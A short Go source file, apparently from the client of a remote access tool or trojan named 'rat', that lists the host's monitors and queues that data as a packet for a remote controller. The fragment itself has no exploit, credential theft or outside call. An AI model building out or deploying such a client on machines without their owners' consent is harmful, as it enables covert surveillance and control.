package main

import (
	"rat/client/screen"
	"rat/common"
)

type MonitorsPacket struct {
	Monitors []screen.Monitor
}

func (packet MonitorsPacket) Header() common.PacketHeader {
	return common.MonitorsHeader
}

func (packet *MonitorsPacket) Init() {
	screen.QueryMonitors()

	packet.Monitors = screen.Monitors
}

func (packet MonitorsPacket) OnReceive() error {
	Queue <- &MonitorsPacket{}
	return nil
}
